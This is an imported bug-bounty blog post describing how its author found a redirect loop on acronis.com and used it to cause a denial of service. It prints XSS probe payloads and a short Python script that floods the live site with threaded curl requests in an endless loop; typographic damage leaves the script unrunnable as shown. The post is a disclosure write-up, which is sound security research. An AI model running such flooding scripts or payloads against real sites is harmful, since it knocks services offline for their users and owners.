---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-11_how-i-downed-acroniscom-in-2-minutes-lucky-bug-write-up.md
original_filename: 2022-01-11_how-i-downed-acroniscom-in-2-minutes-lucky-bug-write-up.md
title: How I downed acronis.com in 2 minutes — Lucky bug write up
category: documents
detected_topics:
- xss
- command-injection
- race-condition
tags:
- imported
- documents
- xss
- command-injection
- race-condition
language: en
raw_sha256: b572554bcae0199ee2a0e248a58ea89008cb1d0f087c79dc091b5cc97f37b50a
text_sha256: f7c5f637fb52c8856d746b1d5f790ca1d7965b6cd2e3b76b66abb882b458279f
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# How I downed acronis.com in 2 minutes — Lucky bug write up

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-11_how-i-downed-acroniscom-in-2-minutes-lucky-bug-write-up.md
- Source Type: markdown
- Detected Topics: xss, command-injection, race-condition
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `b572554bcae0199ee2a0e248a58ea89008cb1d0f087c79dc091b5cc97f37b50a`
- Text SHA256: `f7c5f637fb52c8856d746b1d5f790ca1d7965b6cd2e3b76b66abb882b458279f`


## Content

---
title: "How I downed acronis.com in 2 minutes — Lucky bug write up"
url: "https://medium.com/@veletisleri/how-i-downed-acronis-com-in-2-minutes-lucky-bug-write-up-a563bcdb563d"
authors: ["Ugroon (@veletisleri)"]
programs: ["Acronis"]
bugs: ["DoS"]
publication_date: "2022-01-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3014
scraped_via: "browseros"
---

# How I downed acronis.com in 2 minutes — Lucky bug write up

How I downed acronis.com in 2 minutes — Lucky bug write up
Ugroon
Follow
2 min read
·
Jan 12, 2022

2

Hi bug hunters!!

Today I will share my DoS vulnerabilitiy’s write up.

https://media.tenor.com/videos/43876fd43d878cedbd0a242814708c7d/mp4?c=VjFfZGlzY29yZA

How I found that vuln?

Firstly I was bored and wanted doing some bug bounty, then I was should select a target and guess I was know target, yeah my target was acronis. I wanted test main domain and started. Opened site and checked it with burp suite and saw which code like this; <a href=https://www.acronis.com/somepath>Some content</a>

Then firstly I have tried XSS and used a payload like this (with https://www.acronis.com/en-us/payload): ><svg/src=a onload=alert(1)><a

I was know, probably not vulnerable for XSS but I think that was worth to try. Then not get any pop-up because of payload was encoded. So I tried solve this issue with new line (%0a) new paylaod was %0aonload=alert(1) (with https://www.acronis.com/%0aonload=alert(1) endpoint) and I got a 302 code, location was https://www.acronis.com/en-us/en-us/%0aonload=alert(1)

https://media.tenor.com/videos/2ba1400a9a374a67607ef798973b2110/mp4?c=VjFfZGlzY29yZA

Clicked to follow redirect and at this time I got 302 again with this location: https://www.acronis.com/en-us/en-us/en-us/%0aonload=alert(1)

Get Ugroon’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Then I understood, it’s a misconfiguration which leads to DoS but there is no impact for this scenario. So I fastly wrote a exploit.py

#!/usr/bin/python3
from os import system
from concurrent.futures import ThreadPoolExecutor
threads = []
def exploit():
  system(“curl https://www.acronis.com/en-us/en-us/en-us/%0a -L — max-redirs 100”)
with ThreadPoolExecutor(max_workers=15) as executor:
  while True:
  threads.append(executor.submit(exploit))

Then finally I got 500 server error and stop the attack and reported :D

Press enter or click to view image in full size

Report: https://hackerone.com/reports/1382448

Don’t forget to join our discord server :) — https://discord.gg/bug

Cyaa
